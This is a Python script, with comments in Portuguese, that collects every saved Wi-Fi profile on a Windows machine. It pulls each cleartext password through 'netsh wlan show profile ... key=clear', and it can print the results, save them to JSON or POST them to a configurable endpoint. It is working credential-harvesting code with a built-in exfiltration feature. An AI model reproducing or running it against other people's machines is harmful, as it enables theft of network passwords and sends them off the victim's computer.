import re
import json
import requests
import subprocess

# ENDPOINT para onde o resultado deve ser enviado (opcional, mas se colocar um ENDPOINT, mude a variável da linha 8 para 'True')
ENDPOINT = 'http://localhost'
ENVIAR_RESULTADO = False
SALVAR_RESULTADO = False
EXIBIR_RESULTADO = True

command = 'netsh wlan show profile'

# Muda a codificação para conseguir decodificar o output
decod = 'chcp 65001'
subprocess.run(decod.split(), shell=True, capture_output=True)

def coleta_profiles():
    """ Coleta os perfis salvos no computador """
    profile_list = list()
    profiles = subprocess.run(command.split(), capture_output=True).stdout.decode()
    for profile in re.findall(r':\s\w.*', profiles):
        profile_list.append(profile[2:].strip())
    return profile_list
    
def coleta_senhas(profile_list):
    """ Faz a iteração dos perfis para coletar as senhas """
    resultado = dict()
    protegido = dict()
    livre = list()
    for ssid in profile_list:
        new_c = command + f' "{ssid}" key=clear'
        senha = subprocess.run(new_c.split(), capture_output=True).stdout.decode()
        try:
            pwd = re.search(r'da Chave.*', senha).group().strip()
            pwd = pwd[pwd.index(':')+2:]
            autenticacao = re.search(r'Autenticação\s+:\s.*', senha).group().strip()
            autenticacao = autenticacao[autenticacao.index(':')+2:]
            protegido[ssid] = {"senha": pwd, "autenticacao": autenticacao}
        except:
            livre.append(ssid)
    resultado["quantidade"] = {"livre": len(livre), "protegido": len(protegido), "total": len(protegido) + len(livre)}
    resultado["protegido"] = protegido
    resultado["livre"] = livre
    return resultado

def salva_resultado(resultado):
    """ Salva as informações em formato json """
    with open('Senhas_Wi-fi.json', 'w') as wifi_pwds:
        json.dump(resultado, wifi_pwds, indent=4)

def envia_resultado(resultado):
    """ Envia o resultado para algum ENDPOINT indicado pelo usuário """
    data = {"resultado": resultado}
    response = requests.post(ENDPOINT, json=data)
    return response

def main():
    print("\n[*] Coletando perfis...")
    profile_list = coleta_profiles()
    print("[*] Coletando senhas...")
    resultado = coleta_senhas(profile_list)
    if EXIBIR_RESULTADO:
        print("[*] Exibindo resultado...\n\n"+"#"*55)
        print(json.dumps(resultado, indent=4))
        print("#"*55)
    if SALVAR_RESULTADO:
        print("\n[*] Salvando...")
        salva_resultado(resultado)
        print("[+] Salvo em 'Senhas_Wi-fi.json'...")
    if ENVIAR_RESULTADO and ENDPOINT:
        print("\n[*] Enviando resultado...")
        response = envia_resultado(resultado)
        if response:
            print("[*] Status code: {}".format(response.status_code))
            if response.status_code == 200:
                print("[+] Enviado com sucesso...")
            else:
                print("[-] Ocorreu algum erro: {}".format(response.text))
    print("\n[*] Finalizado...\n")


if __name__ == '__main__':
    main()